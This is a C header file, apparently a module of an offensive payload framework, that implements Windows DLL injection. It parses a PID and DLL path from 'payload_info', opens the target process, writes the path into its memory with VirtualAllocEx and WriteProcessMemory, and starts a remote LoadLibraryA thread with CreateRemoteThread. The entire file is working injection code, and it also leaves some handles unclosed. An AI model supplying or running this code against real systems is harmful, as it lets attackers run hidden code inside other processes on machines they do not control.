#pragma once

#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include "../debug_print/debug_print.h"


// payload_info format:     pid,dll_path
// pid specifies the process ID of the process to inject the DLL into
// dll_path specifies the path of the DLL that will be injected into the target.
// This implies that the DLL to be injected must reside on the target's disk.
//
// This was sucessfully tested on both 32 ad 64-bit systems.
// Friendly reminder: only inject 32-bit dlls into 32-bit processes, and 64-bit dlls into 64-bit processes
void inject_dll(unsigned char *payload, int payload_size, char *payload_info) {
    char *delimiter;
    char *target_pid_string;
    char *dll_path;
    DWORD target_pid;
    LPVOID loadlibrary_address;
    LPVOID remote_buffer;
    HANDLE h_proc;
    HANDLE h_remote_thread;
    
    DEBUG_PRINT("Starting inject_dll routine...\n");

    // Extract arguments from payload_info
    // Both pid and dll_path are required, so assume that delimiter ',' is set.

    // Cut out pid string by ending the string at delimiter position
    delimiter = strchr(payload_info, ',');    
    target_pid_string = payload_info;
    *delimiter = '\0';
    target_pid = strtoul(target_pid_string, NULL, 0);
    DEBUG_PRINT("Extracted payload_info::target_pid argument = %u\n", target_pid);

    // Extract dll_path string by starting after the delimiter
    dll_path = delimiter + 1;
    DEBUG_PRINT("Extracted payload_info::dll_path argument = %s\n", dll_path);
    
    if(target_pid == 0) {
        DEBUG_PRINT("Invalid target PID.\n");
        return;
    }

    // Access target process
    DEBUG_PRINT("Accessing target process...\n");
    h_proc = OpenProcess((PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ), FALSE, target_pid);
    
    if(h_proc == NULL) {
        DEBUG_PRINT("Failed to retrieve handle.\n");
        return;
    }

    // Retrieve address of LoadLibraryA function
    DEBUG_PRINT("Retrieving address of LoadLibraryA function...\n");
    loadlibrary_address = (LPVOID) GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if(loadlibrary_address == NULL) {
        DEBUG_PRINT("Failed to retrieve address.\n");
        return;    
    }    

    // Allocate buffer in target process to store the path to the dll to be injected
    DEBUG_PRINT("Allocating at least %d bytes of memory in target process to store dll path...\n", strlen(dll_path));
    remote_buffer = VirtualAllocEx(h_proc, NULL, strlen(dll_path), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
    if(remote_buffer == NULL) {
        DEBUG_PRINT("Memory allocation failed, system error code is %u.\n", GetLastError());
        return;
    }

    // Write dll path into allocated memory
    DEBUG_PRINT("Writing dll path into allocated memory...\n");
    if(WriteProcessMemory(h_proc, remote_buffer, (LPCVOID) dll_path, strlen(dll_path), NULL) == 0) {
        DEBUG_PRINT("Write operation failed, system error code is %u.\n", GetLastError());
        return;
    }

    // Creating remote thread that invokes the dll via LoadLibrary
    DEBUG_PRINT("Creating remote thread that invokes the DLL via LoadLibrary...\n");
    h_remote_thread = CreateRemoteThread(h_proc, NULL, 0, (LPTHREAD_START_ROUTINE) loadlibrary_address, remote_buffer, 0, NULL);
    if(h_remote_thread == NULL) {
        DEBUG_PRINT("Thread creation failed, system error code is %u.\n", GetLastError());
        return;
    }

    CloseHandle(h_proc);    
}
